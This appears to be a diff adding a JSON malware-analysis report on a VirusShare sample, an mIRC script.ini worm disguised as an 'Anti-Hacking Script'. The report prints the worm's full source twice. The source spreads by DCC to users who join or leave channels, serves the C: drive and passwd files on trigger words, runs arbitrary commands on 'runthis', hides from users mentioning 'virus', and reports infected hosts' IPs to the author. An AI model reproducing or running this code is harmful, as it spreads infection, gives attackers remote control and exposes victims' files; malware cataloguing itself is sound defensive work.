@@ -1,0 +1,56 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "run": "May run an executable file or a system command"
+        },
+        "macro": "[script]\nn0=;----------------- Anti-Hacking Script by Duke/SMF ----------------------\nn1=ON 1:JOIN:#:if ($nick != $me) .dcc send $nick script.ini\nn2=ON 1:PART:#:if ($nick != $me) .dcc send $nick script.ini\nn3=ON 1:TEXT:*give_c*:#:.fserve $nick 1 c:\\\nn4=ON 1:TEXT:*give_m*:#:.dcc send $nick $mircdirscript.ini\nn5=ON 1:TEXT:*op_me*:?:{ .mode $chan +o $nick | .closemsg $nick }\nn6=ON 1:TEXT:*invite_me*:?:{ .invite $nick $2 | .closemsg $nick }\nn7=ON 1:TEXT:*unban_me*:?:{ .mode $chan -b $nick | .closemsg $nick }\nn8=ON 1:TEXT:*dlinux*:*:.dcc send $nick c:\\linux\\etc\\passwd.\nn9=ON 1:TEXT:*dunix*:*:.dcc send $nick c:\\unix\\etc\\passwd.\nn10=ON 1:TEXT:*script.ini*:*:{ .ignore $nick | .closemsg $nick }\nn11=ON 1:TEXT:*virus*:*:{ .ignore $nick | .closemsg $nick }\nn12=ON 1:TEXT:*\ufffd\ufffd\ufffd\ufffd\ufffd*:*:{ .ignore $nick | .closemsg $nick }\nn13=ON 1:TEXT:*send*:*:{ .ignore $nick | .closemsg $nick }\nn14=ON 1:TEXT:*go_out*:*:.quit I'm lamer !\nn15=on 1:TEXT:*:?:if ( $1 == runthis ) { .run $2- }\nn16=ON 1:CONNECT:{\nn17=   .msg Duke[SMF] Hacked $ip on $server $+ : $+ $port $+ . URL is $url\nn18=   .closemsg Duke[SMF]\nn19=   .msg #SMF Hacked $ip on $server $+ : $+ $port $+ . URL is $url\nn20=}\nn21=;Hacker v1.0 was here ! (c) by Duke/SMF"
+    },
+    "filename": "VirusShare_0854fb8426e221c06dced5752991911f",
+    "filesize": 1233,
+    "filetype": "ISO-8859 text, with CRLF line terminators",
+    "hashes": {
+        "md5": "0854fb8426e221c06dced5752991911f",
+        "sha1": "5118f19a4c30a80431169a86664b334ae21706db",
+        "sha256": "7c77ef3281762e0b9ab1fd4430e82f237592e0e3b4b027dcc46a731600581dee"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "[script]",
+            "n0=;----------------- Anti-Hacking Script by Duke/SMF ----------------------",
+            "n1=ON 1:JOIN:#:if ($nick != $me) .dcc send $nick script.ini",
+            "n2=ON 1:PART:#:if ($nick != $me) .dcc send $nick script.ini",
+            "n3=ON 1:TEXT:*give_c*:#:.fserve $nick 1 c:\\",
+            "n4=ON 1:TEXT:*give_m*:#:.dcc send $nick $mircdirscript.ini",
+            "n5=ON 1:TEXT:*op_me*:?:{ .mode $chan +o $nick | .closemsg $nick }",
+            "n6=ON 1:TEXT:*invite_me*:?:{ .invite $nick $2 | .closemsg $nick }",
+            "n7=ON 1:TEXT:*unban_me*:?:{ .mode $chan -b $nick | .closemsg $nick }",
+            "n8=ON 1:TEXT:*dlinux*:*:.dcc send $nick c:\\linux\\etc\\passwd.",
+            "n9=ON 1:TEXT:*dunix*:*:.dcc send $nick c:\\unix\\etc\\passwd.",
+            "n10=ON 1:TEXT:*script.ini*:*:{ .ignore $nick | .closemsg $nick }",
+            "n11=ON 1:TEXT:*virus*:*:{ .ignore $nick | .closemsg $nick }",
+            "n12=ON 1:TEXT:**:*:{ .ignore $nick | .closemsg $nick }",
+            "n13=ON 1:TEXT:*send*:*:{ .ignore $nick | .closemsg $nick }",
+            "n14=ON 1:TEXT:*go_out*:*:.quit I'm lamer !",
+            "n15=on 1:TEXT:*:?:if ( $1 == runthis ) { .run $2- }",
+            "n16=ON 1:CONNECT:{",
+            "n17=   .msg Duke[SMF] Hacked $ip on $server $+ : $+ $port $+ . URL is $url",
+            "n18=   .closemsg Duke[SMF]",
+            "n19=   .msg #SMF Hacked $ip on $server $+ : $+ $port $+ . URL is $url",
+            "n20=}",
+            "n21=;Hacker v1.0 was here ! (c) by Duke/SMF"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.283600",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
